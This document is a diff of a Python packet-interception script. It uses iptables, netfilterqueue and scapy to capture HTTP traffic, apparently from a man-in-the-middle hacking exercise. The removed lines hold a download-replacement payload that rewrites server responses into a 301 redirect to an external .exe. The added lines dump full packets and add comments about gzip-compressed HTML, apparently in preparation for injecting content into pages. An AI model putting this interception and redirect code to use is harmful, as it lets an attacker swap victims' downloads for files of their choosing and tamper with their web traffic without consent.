@@ -6,8 +6,6 @@ import netfilterqueue
 import scapy.all as scapy
 import subprocess
 
-ack_list = [] #initiliaze outside of function, otherwise it will reinitialize for every packet
-
 def set_iptables(): #automate setting IPtables for testing on localhost
     print("\n[+] Setting up IPTables\n")
     subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
@@ -29,15 +27,17 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] HTTP Request outbound found")
-            #print(scapy_packet.show())
+            print("===================================")
+            print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
-            print("[+] HTTP Response Inbound found")
-            #print(scapy_packet.show())
-            if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab.com/rar/wrar571.exe\n\n")
-                packet.set_payload(str(modified_packet))
+            print("[+] HTTP Response Inbound found:")
+            print("===================================")
+            print(scapy_packet.show())
+            
+            #want to first show the packet contents to see what fields to modify
+            #using this you see that the Raw layer contains following:
+            #Accept-Encoding: gzip, deflate
+            #HTML is compressed with gzip then sent to client from server
 
     packet.accept() #forward packets to target, connectivity seems normal
 
